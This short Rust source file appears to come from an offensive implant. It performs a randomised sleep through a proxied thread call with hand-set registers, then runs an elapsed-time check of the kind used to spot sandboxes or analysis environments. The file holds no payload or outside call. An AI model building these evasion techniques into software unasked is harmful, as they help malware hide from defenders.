use crate::generated::consts::SLEEP_DURATION;
use crate::registers;
use std::time::{Duration, SystemTime};

#[allow(improper_ctypes_definitions)]
extern "C" fn sleep(time: Duration) {
    std::thread::sleep(time)
}

pub fn proxied_sleep() -> bool {
    use super::thread::one_shot;

    let time = Duration::from_secs(rand::random_range(0..=SLEEP_DURATION));
    let now = SystemTime::now();
    dprintln!("[+] Sleeping for {:#?}", time);

    one_shot(sleep as *const usize, &registers!(&time), &[]).unwrap();

    dprintln!("[+] Done");
    if let Ok(elapsed) = now.elapsed() {
        if elapsed < time + Duration::from_secs(3) {
            return false;
        }
    }
    true
}
